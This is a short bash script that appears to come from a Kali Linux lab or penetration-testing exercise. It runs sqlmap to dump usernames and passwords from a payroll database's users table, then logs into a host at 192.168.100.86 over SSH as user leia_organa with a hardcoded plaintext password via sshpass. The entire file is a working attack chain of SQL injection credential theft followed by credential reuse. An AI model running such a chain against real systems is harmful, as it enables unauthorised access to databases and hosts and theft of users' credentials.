#!/bin/bash


sqlmap -r /home/kali/baw-git/attacks_conf/request.txt --batch -D payroll -T users -C username,password --dump

PASSWORD=help_me_obiwan
sshpass -p $PASSWORD ssh -q leia_organa@192.168.100.86 'groups'
